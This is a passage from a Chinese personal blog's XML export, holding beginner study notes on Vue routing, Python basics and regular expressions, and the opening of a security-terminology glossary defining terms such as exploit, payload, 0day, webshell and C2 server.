</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="一个简单的使用vue路由的例子"><a href="#一个简单的使用vue路由的例子" class="headerlink" title="一个简单的使用vue路由的例子"></a>一个简单的使用vue路由的例子</h3><h4 id="在main-js中"><a href="#在main-js中" class="headerlink" title="在main.js中"></a>在main.js中</h4><ol><li><p>引入路由和历史规则（2）</p></li><li><p>然后在下方创建一个常量 router 存放 createRouter()函数创建的路由对象。（8）</p></li><li><p>填充对象的属性。（10-11）</p></li><li><p>在createApp函数调用时，要使用use()方法，定义根组件所使用的路由。（18）</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./style.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;./views/Home.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ChickenEgg</span> <span class="keyword">from</span> <span class="string">&#x27;./views/ChickenEgg.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(</span><br><span class="line">    &#123;</span><br><span class="line"><span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line"><span class="attr">routes</span>: [</span><br><span class="line">&#123;<span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Home</span> &#125;,</span><br><span class="line">&#123;<span class="attr">path</span>: <span class="string">&#x27;/chicken-egg&#x27;</span>, <span class="attr">component</span>: <span class="title class_">ChickenEgg</span> &#125;</span><br><span class="line">]        </span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">use</span>(router).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意：routes数组中，component键的值已经在4-5行导入。</p><h4 id="在App-js中"><a href="#在App-js中" class="headerlink" title="在App.js中"></a>在App.js中</h4><ol><li>直接在template里塞入一个<router-view>的标签</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>大功告成。</p><h3 id="使用a标签-router-view标签进行页面组件的切换跳转"><a href="#使用a标签-router-view标签进行页面组件的切换跳转" class="headerlink" title="使用a标签/router-view标签进行页面组件的切换跳转"></a>使用a标签/router-view标签进行页面组件的切换跳转</h3><p>前面已经简单实现了vue路由。</p><p>简单来说，vue路由的作用就是把不同的组件与网站中不同的路径相关联，当输入某个url路径时，页面位置会切换到对应的组件。</p><h4 id="使用进行页面切换的两种途径："><a href="#使用进行页面切换的两种途径：" class="headerlink" title="使用进行页面切换的两种途径："></a>使用进行页面切换的两种途径：</h4><ol><li>a标签（3-4）</li><li>router-link标签（5-6）</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在App.vue中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>主页<span class="tag">&lt;/<span class="name">a</span>&gt;</span> | </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/chicken-egg&quot;</span>&gt;</span>鸡蛋<span class="tag">&lt;/<span class="name">a</span>&gt;</span> |</span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&#x27;/&#x27;</span>&gt;</span>主页<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span> |</span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&#x27;/chicken-egg&#x27;</span>&gt;</span>鸡蛋<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两种方法都可行，但是使用router-link标签将不会导致页面刷新。（高效）</p><blockquote><p>使用router-link标签时，需要注意到其中的to属性</p><p>这里的to属性对应的就是显示当前数据时地址栏的url内容。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python初学</title>
      <link href="/2023/06/07/%E5%B0%8F%E5%AF%84%E5%B7%A7/Python%E5%88%9D%E5%AD%A6/"/>
      <url>/2023/06/07/%E5%B0%8F%E5%AF%84%E5%B7%A7/Python%E5%88%9D%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="Python初学"><a href="#Python初学" class="headerlink" title="Python初学"></a>Python初学</h1><blockquote><p>版本：3.8.0（与python2语法有区别)</p></blockquote><h2 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h2><p>整数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">5</span></span><br></pre></td></tr></table></figure><p>字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;&#x27;This is a multi-line string.</span></span><br><span class="line"><span class="string">This is the second line.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>诸如此类…</p><hr><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;请输入数据到a&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="打印变量"><a href="#打印变量" class="headerlink" title="打印变量"></a>打印变量</h2><p>打印字符常量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure><p>打印变量值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>打印字符变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>混合类型打印示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(a,s,<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>尽管a，s，“hello world”三个变量间我们没有指定空格，但是python会自动给他加上空格</p></blockquote><p>输出结果：</p><blockquote><p>5 This is a multi-line string.</p><p>This is the second line. hello world</p></blockquote><hr><h2 id="控制流语句"><a href="#控制流语句" class="headerlink" title="控制流语句"></a>控制流语句</h2><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">number = <span class="number">23</span></span><br><span class="line">guess = <span class="built_in">int</span>(raw_input(<span class="string">&#x27;Enter an integer : &#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> guess == number:</span><br><span class="line"> <span class="built_in">print</span> (<span class="string">&#x27;Congratulations, you guessed it.&#x27;</span>) </span><br><span class="line"> <span class="built_in">print</span> (<span class="string">&quot;(but you do not win any prizes!)&quot;</span>) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">elif</span> guess &lt; number:</span><br><span class="line"> <span class="built_in">print</span> (<span class="string">&#x27;No, it is a little higher than that&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> <span class="built_in">print</span> (<span class="string">&#x27;No, it is a little lower than that&#x27;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;Done&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">3</span></span><br><span class="line"><span class="keyword">while</span> i:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i=i-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="for-in-循环"><a href="#for-in-循环" class="headerlink" title="for in 循环"></a>for in 循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>): <span class="comment"># range(1,5)：返回一个连续的整数数组，范围是从1到4</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The for loop is over&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="break-continue语句-用法一样"><a href="#break-continue语句-用法一样" class="headerlink" title="break/continue语句(用法一样)"></a>break/continue语句(用法一样)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="keyword">if</span> i != <span class="number">5</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;five! break!&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><hr><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sayHello</span>():</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;Hello World!&#x27;</span>) <span class="comment"># block belonging to the function</span></span><br><span class="line">sayHello() <span class="comment"># call the function </span></span><br></pre></td></tr></table></figure><h3 id="函数形参"><a href="#函数形参" class="headerlink" title="函数形参"></a>函数形参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printMax</span>(<span class="params">a, b</span>):</span><br><span class="line"><span class="keyword">if</span> a &gt; b:</span><br><span class="line">    <span class="built_in">print</span> (a, <span class="string">&#x27;is maximum&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (b, <span class="string">&#x27;is maximum&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printMax(<span class="number">3</span>, <span class="number">4</span>) <span class="comment"># directly give literal values</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line">y = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">printMax(x, y) <span class="comment"># give variables as arguments </span></span><br></pre></td></tr></table></figure><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;x is&#x27;</span>, x)</span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;Changed local x to&#x27;</span>, x)</span><br><span class="line">    </span><br><span class="line">x = <span class="number">50</span></span><br><span class="line">func(x)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;x is still&#x27;</span>, x)</span><br></pre></td></tr></table></figure><blockquote><p>变量作用域 与c语言类似</p><p>注意函数被调用的次序</p></blockquote><h3 id="global语句（定义全局变量）"><a href="#global语句（定义全局变量）" class="headerlink" title="global语句（定义全局变量）"></a>global语句（定义全局变量）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def func():</span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    print (<span class="string">&#x27;x is&#x27;</span>, x)</span><br><span class="line">    x <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    print (<span class="string">&#x27;Changed local x to&#x27;</span>, x)</span><br><span class="line"> </span><br><span class="line">x <span class="operator">=</span> <span class="number">50</span></span><br><span class="line">func()</span><br><span class="line">print (<span class="string">&#x27;Value of x is&#x27;</span>, x)</span><br></pre></td></tr></table></figure><blockquote><p>与c语言类似</p></blockquote><h3 id="默认参数值"><a href="#默认参数值" class="headerlink" title="默认参数值"></a>默认参数值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">message, times = <span class="number">1</span></span>):</span><br><span class="line"><span class="built_in">print</span> message * times</span><br><span class="line"></span><br><span class="line">say(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">say(<span class="string">&#x27;World&#x27;</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure><blockquote><p>只有在形参表末尾的那些参数可以有默认参数值</p></blockquote><h3 id="关键参数（特性）"><a href="#关键参数（特性）" class="headerlink" title="关键参数（特性）"></a>关键参数（特性）</h3><blockquote><p>如果你的某个函数有许多参数，而你只想指定其中的一部分，那么你可以通过命名来为这些参 数赋值——这被称作 关键参数 ——我们使用名字（关键字）而不是位置（我们前面所一直使 用的方法）来给函数指定实参。</p></blockquote><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">func(<span class="number">3</span>, <span class="number">7</span>)<span class="comment"># 常规用法</span></span><br><span class="line">func(<span class="number">25</span>, c=<span class="number">24</span>)<span class="comment"># 关键参数指定为c复制</span></span><br></pre></td></tr></table></figure><p>完整例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a, b=<span class="number">5</span>, c=<span class="number">10</span></span>):</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;a is&#x27;</span>, a, <span class="string">&#x27;and b is&#x27;</span>, b, <span class="string">&#x27;and c is&#x27;</span>, c)</span><br><span class="line">    </span><br><span class="line">func(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">func(<span class="number">25</span>, c=<span class="number">24</span>)</span><br><span class="line">func(c=<span class="number">50</span>, a=<span class="number">100</span>) </span><br></pre></td></tr></table></figure><h3 id="return-语句"><a href="#return-语句" class="headerlink" title="return 语句"></a>return 语句</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">maximum</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> x &gt; y:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span> (maximum(<span class="number">2</span>, <span class="number">3</span>))</span><br></pre></td></tr></table></figure><blockquote><p>和c类似</p></blockquote><h3 id="DocStrings（特性）"><a href="#DocStrings（特性）" class="headerlink" title="DocStrings（特性）"></a>DocStrings（特性）</h3><blockquote><p>Python有一个很奇妙的特性，称为 文档字符串 ，它通常被简称为 docstrings 。DocStrings是一个 重要的工具，由于它帮助你的程序文档更加简单易懂，你应该尽量使用它。你甚至可以在程序 运行的时候，从函数恢复文档字符串</p></blockquote><p>简而言之：能打印函数里‘’‘ ’‘’ 三引号引起来的内容 使用方法是 函数名.__doc__</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printMax</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Prints the maximum of two numbers.</span></span><br><span class="line"><span class="string">    The two values must be integers.&#x27;&#x27;&#x27;</span></span><br><span class="line">    x = <span class="built_in">int</span>(x) <span class="comment"># convert to integers, if possible</span></span><br><span class="line">    y = <span class="built_in">int</span>(y)</span><br><span class="line">    <span class="keyword">if</span> x &gt; y:</span><br><span class="line">        <span class="built_in">print</span> (x, <span class="string">&#x27;is maximum&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (y, <span class="string">&#x27;is maximum&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">printMax(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span> (printMax.__doc__)</span><br></pre></td></tr></table></figure><p>输出结果：</p><blockquote><p>5 is maximum<br>Prints the maximum of two numbers.<br>    The two values must be integers.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式初学</title>
      <link href="/2023/05/08/%E5%B0%8F%E5%AF%84%E5%B7%A7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%88%9D%E5%AD%A6/"/>
      <url>/2023/05/08/%E5%B0%8F%E5%AF%84%E5%B7%A7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%88%9D%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式初学"><a href="#正则表达式初学" class="headerlink" title="正则表达式初学"></a>正则表达式初学</h1><p>正则表达式在线测试工具：<a href="https://regex101.com/">https://regex101.com/</a></p><hr><h2 id="常用限定符"><a href="#常用限定符" class="headerlink" title="常用限定符"></a>常用限定符</h2><h3 id=""><a href="#" class="headerlink" title="?"></a>?</h3><blockquote><p>前面的字符出现0次或1次</p></blockquote><h3 id="-1"><a href="#-1" class="headerlink" title="*"></a>*</h3><blockquote><p>前面的字符出现包括0次的任意次</p></blockquote><h3 id="-2"><a href="#-2" class="headerlink" title="+"></a>+</h3><blockquote><p>前面的字符出现一次以上</p></blockquote><h3 id="-3"><a href="#-3" class="headerlink" title="{ }"></a>{ }</h3><blockquote><p>精确匹配</p></blockquote><blockquote><p>例：</p><p>{6}：前面的字符出现6次</p><p>{3,6}: 前面的字符出现3到6次</p><p>{3,}: 前面的字符出现3次以上</p></blockquote><hr><h2 id="原子组"><a href="#原子组" class="headerlink" title="原子组"></a>原子组</h2><p>我的理解是配合限定符修饰使用。</p><p>原子即不可分割，限定符的限定作用对对应的一个原子组生效。</p><p>如</p><blockquote><p>(ab){3,6}</p></blockquote><p>这里原子组为(a,b)，限定符为{3,6}  匹配连续出现一次及以上的“ab”</p><p>如：ab、ababab、ababab…….</p><h3 id="常见原子组："><a href="#常见原子组：" class="headerlink" title="常见原子组："></a>常见原子组：</h3><h4 id="一、用括号括起来的部分"><a href="#一、用括号括起来的部分" class="headerlink" title="一、用括号括起来的部分"></a>一、用括号括起来的部分</h4><blockquote><ul><li>(ab)</li><li>(cat|dog)   表示匹配cat或者dog    注：a(cat|dog){3}这里的限定符{3}只对(cat|dog)作限制。</li><li>…诸如此类</li></ul></blockquote><h4 id="二、用方括号括起来的部分"><a href="#二、用方括号括起来的部分" class="headerlink" title="二、用方括号括起来的部分"></a>二、用方括号括起来的部分</h4><p>方括号括起来的部分表示字符的范围</p><blockquote><p>[abc] ：要求匹配的字符只能取自于a、b、c其中任意一个</p><p>[a-z]：表示匹配小写字母（从a到z）</p><p>[a-zA-Z1-9]：表示匹配大小写字母和数字</p></blockquote><p>在方括号内字符前加上尖括号表示不匹配的字符</p><blockquote><p>[^1-9]：表示所有非数字字符（包括换行符）</p></blockquote><hr><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>预先定义好的一系列常用字符类型</p><h3 id="常用元字符"><a href="#常用元字符" class="headerlink" title="常用元字符"></a>常用元字符</h3><blockquote><p>\d：数字字符</p><p>\D：非数字字符</p></blockquote><blockquote><p>\w：单词字符（所有的英文字符数字上下划线）</p><p>\W：非单词字符</p></blockquote><blockquote><p>\s：空白字符（包含tab字符（制表符）以及所有的换行符）</p><p>\S：非空白字符</p></blockquote><blockquote><p>. ：代表任意字符（不包括换行符）</p><p>^：匹配行首</p><p>$：匹配行尾</p></blockquote><blockquote><p>\b：代表单词字符的边界</p></blockquote><hr><h2 id="贪婪-懒惰匹配"><a href="#贪婪-懒惰匹配" class="headerlink" title="贪婪/懒惰匹配"></a>贪婪/懒惰匹配</h2><h3 id="“-”-能将正则表达式的贪婪匹配转换成懒惰匹配"><a href="#“-”-能将正则表达式的贪婪匹配转换成懒惰匹配" class="headerlink" title="“?” 能将正则表达式的贪婪匹配转换成懒惰匹配"></a>“?” 能将正则表达式的贪婪匹配转换成懒惰匹配</h3><p>正则表达式默认会尽可能匹配更多的字符——贪婪匹配</p><p>如当我们想匹配某个html标签</p><blockquote><p>&lt;.+&gt;</p></blockquote><p>默认会把以下整个字符串全部匹配</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>xxxxxxxxxx<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&gt;<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而加上一个  “?”</p><blockquote><p>&lt;.+?&gt;</p></blockquote><p>则只会匹配其中的标签——懒惰匹配</p>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> 正则表达式初学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全术语</title>
      <link href="/2023/04/22/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86_%E5%AE%89%E5%85%A8%E6%9C%AF%E8%AF%AD/"/>
      <url>/2023/04/22/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86_%E5%AE%89%E5%85%A8%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="安全术语"><a href="#安全术语" class="headerlink" title="安全术语"></a>安全术语</h1><hr><h2 id="漏洞利用术语"><a href="#漏洞利用术语" class="headerlink" title="漏洞利用术语"></a>漏洞利用术语</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><blockquote><p>POC（Proof of Concept）：概念验证，用于验证安全漏洞是否存在，能否被利用。</p></blockquote><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><blockquote><p>EXP(Exploit)：漏洞利用，代表一段有漏洞利用价值的攻击代码或一个漏洞利用过程</p></blockquote><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><blockquote><p>Payload：攻击载荷，通常是指Exploit拿下目标之后，攻击者在目标机器上执行的定制代码或程序，包括执行系统命令、建立会话。</p></blockquote><h3 id="安全漏洞生命周期三个阶段："><a href="#安全漏洞生命周期三个阶段：" class="headerlink" title="安全漏洞生命周期三个阶段："></a>安全漏洞生命周期三个阶段：</h3><blockquote><ul><li><p>漏洞被发现</p></li><li><p>漏洞信息被公布</p></li><li><p>漏洞具有官方补丁或修复方案</p></li></ul></blockquote><p>伴生出的概念：</p><blockquote><ul><li>0day，漏洞信息未公布时，此时利用EXP可以通杀。</li><li>1day，漏洞信息被公布，但漏洞没有官方的补丁或修复方案，此时利用EXP可以入侵大部分系统。</li><li>Nday，漏洞已经有补丁，此时利用EXP只能入侵还未及时修复的系统</li></ul></blockquote><h3 id="CVE-CNVD"><a href="#CVE-CNVD" class="headerlink" title="CVE/CNVD"></a>CVE/CNVD</h3><blockquote><p>CVE(Common Vulnerabilities &amp; Exposures): 通用漏洞披露，相当于全球漏洞的百科全书。</p></blockquote><blockquote><p>CNVD全称 国家信息安全漏洞共享平台，是一个国家网络安全漏洞库。收录的各类漏洞会被赋予CNVD编号。</p></blockquote><h3 id="Shell-Webshell"><a href="#Shell-Webshell" class="headerlink" title="Shell/Webshell"></a>Shell/Webshell</h3><blockquote><p>shell是一个应用程序。它连接了用户和Linux内核，让用户能高效使用Linux内核。</p></blockquote><blockquote><p>webshell 是以asp、php、jsp、cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。</p></blockquote><hr><h2 id="基础设施术语"><a href="#基础设施术语" class="headerlink" title="基础设施术语"></a>基础设施术语</h2><h3 id="c2服务器"><a href="#c2服务器" class="headerlink" title="c2服务器"></a>c2服务器</h3><blockquote><p>c2服务器：command and control server 命令和控制服务器。 可以理解为攻击者发送控制命令的服务端</p></blockquote><h3 id="内、外网"><a href="#内、外网" class="headerlink" title="内、外网"></a>内、外网</h3><blockquote><ul><li>内网：企业内网、局域网。 外部用户无法直接访问</li><li>外网： 常指互联网</li></ul></blockquote><h3 id="DMZ区"><a href="#DMZ区" class="headerlink" title="DMZ区"></a>DMZ区</h3><blockquote><p>内网中的一个特殊区域         